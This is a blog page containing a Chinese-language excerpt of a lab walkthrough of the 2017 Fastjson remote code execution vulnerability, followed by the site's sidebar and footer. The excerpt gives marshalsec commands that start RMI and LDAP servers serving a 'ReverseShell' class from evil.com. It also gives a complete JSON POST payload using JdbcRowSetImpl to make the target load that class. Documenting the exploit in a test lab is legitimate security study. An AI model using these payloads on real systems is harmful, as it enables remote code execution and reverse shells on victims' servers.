+<p>借助<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>项目(测试Jdk8u211)，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>ReverseShell.class</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240325133052275.png" alt="image-20240325133052275"></p>
+<p>向靶场服务器发送Payload，带上RMI的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/ReverseShell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240325133148708.png" alt="image-20240325133148708"></p>
+<p>Final</p>
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240325133308910.png" alt="image-20240325133308910"></p>
+<p><strong>LDAP</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240325135737374.png" alt="image-20240325135737374"></p>
+
+	
+	</div>
+  <a type="button" href="/2024/04/12/Vuln/2017 Fastjson 远程命令执行漏洞/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/5/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/7/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/Java/">Java<span>12</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>10</span></a></li>
+		
+			<li><a href="/categories/Pollution/">Pollution<span>2</span></a></li>
+		
+			<li><a href="/categories/SSRF/">SSRF<span>1</span></a></li>
+		
+			<li><a href="/categories/Tool/">Tool<span>1</span></a></li>
+		
+			<li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
+		
+			<li><a href="/categories/Writeup/">Writeup<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+	<div class="widget">
+		<h4>Tag Cloud</h4>
+		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
+		
+			<li><a href="/tags/Python/">Python<span>1</span></a></li>
+		
+			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
+		
+			<li><a href="/tags/Node-js/">Node.js<span>1</span></a></li>
+		
+			<li><a href="/tags/Java-Deserialize/">Java Deserialize<span>5</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/CISCN/">CISCN<span>1</span></a></li>
+		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/JavaScript/">JavaScript<span>1</span></a></li>
+		
+			<li><a href="/tags/tunnel/">tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+		
+		 
+		</ul>
+	</div>
+
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/09/12/Tool/ligolo-ng/" ><i class="fa fa-file-o"></i>Ligolo-ng Note</a>
+      </li>
+    
+      <li>
+        <a href="/2024/08/02/Pentest/HTB/HTB Runner/" ><i class="fa fa-file-o"></i>HTB Runner</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/31/Pentest/HTB/HTB SolarLab/" ><i class="fa fa-file-o"></i>HTB SolarLab</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/26/Pentest/HTB/HTB IClean/" ><i class="fa fa-file-o"></i>HTB IClean</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/24/Pentest/HTB/HTB TwoMillion/" ><i class="fa fa-file-o"></i>HTB TwoMillion</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
